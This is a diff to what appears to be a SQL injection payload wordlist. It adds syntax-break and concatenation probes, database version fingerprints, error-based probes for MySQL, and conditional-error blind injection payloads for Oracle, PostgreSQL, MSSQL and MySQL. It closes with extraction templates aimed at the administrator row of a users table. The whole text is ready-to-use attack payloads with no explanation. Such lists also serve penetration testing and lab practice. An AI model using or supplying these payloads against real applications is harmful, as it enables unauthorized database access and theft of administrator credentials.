@@ -6,7 +6,9 @@
 
 ## 1. BARE SYNTAX-BREAK PROBES
 '
+''
 "
+""
 `
 ')
 ")
@@ -226,3 +228,82 @@
 ' ORDER BY 18--
 ' ORDER BY 19--
 ' ORDER BY 20--
+
+## 8. QUOTE-PAIR CONFIRMATION
+'
+''
+"
+""
+
+## 9. CONCAT SYNTAX PROBES — single quote
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+'+(SELECT '')+'
+' (SELECT '')
+'||(SELECT '' FROM sqlite_master)||'
+CONCAT('','')
+
+## 9b. CONCAT SYNTAX PROBES — double quote
+"||(SELECT "")||"
+"||(SELECT "" FROM dual)||"
+"+(SELECT "")+"
+" (SELECT "")
+"||(SELECT "" FROM sqlite_master)||"
+
+## 10. FINGERPRINT PAIR — dual vs no-dual
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+
+## 11. VALID vs INVALID TABLE
+'||(SELECT '' FROM dual)||'
+'||(SELECT '' FROM not_a_real_table)||'
+'||(SELECT '' FROM users WHERE ROWNUM=1)||'
+
+## 12. VERSION FINGERPRINTS — single quote
+'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'
+'||(SELECT version())||'
+'+@@version+'
+'+CONCAT(@@version)+'
+'||(SELECT sqlite_version())||'
+
+## 12b. VERSION FINGERPRINTS — double quote
+"||(SELECT banner FROM v$version WHERE ROWNUM=1)||"
+"||(SELECT version())||"
+"+@@version+"
+"||(SELECT sqlite_version())||"
+
+## 13. MySQL-SPECIFIC
+' AND (SELECT @@version) IS NOT NULL-- -
+' AND (SELECT 1 FROM dual WHERE 1=1)-- -
+' AND extractvalue(1,concat(0x7e,version()))-- -
+' AND (SELECT CONCAT('a','b'))='ab'-- -
+
+## 14. CONDITIONAL ERROR — Oracle (single quote)
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+## 14. CONDITIONAL ERROR — PostgreSQL (single quote)
+'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS int) ELSE '' END)||'
+'||(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS int) ELSE '' END)||'
+
+## 14. CONDITIONAL ERROR — MSSQL (single quote)
+'+(SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)+'
+'+(SELECT CASE WHEN (1=2) THEN 1/0 ELSE '' END)+'
+
+## 14. CONDITIONAL ERROR — MySQL
+' AND (SELECT CASE WHEN (1=1) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)-- -
+' AND (SELECT CASE WHEN (1=2) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)-- -
+' AND extractvalue(1,CASE WHEN (1=1) THEN concat(0x7e,1) ELSE 1 END)-- -
+
+## 14. CONDITIONAL ERROR — double quote mirrors
+"||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||"
+"||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||"
+"||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS int) ELSE '' END)||"
+"||(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS int) ELSE '' END)||"
+"+(SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)+"
+"+(SELECT CASE WHEN (1=2) THEN 1/0 ELSE '' END)+"
+
+## 15. EXTRACTION TEMPLATES ({1} = generated condition)
+'||(SELECT CASE WHEN ({1}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN ({1}) THEN CAST(1/0 AS int) ELSE '' END FROM users WHERE username='administrator')||'
+'+(SELECT CASE WHEN ({1}) THEN 1/0 ELSE '' END FROM users WHERE username='administrator')+'
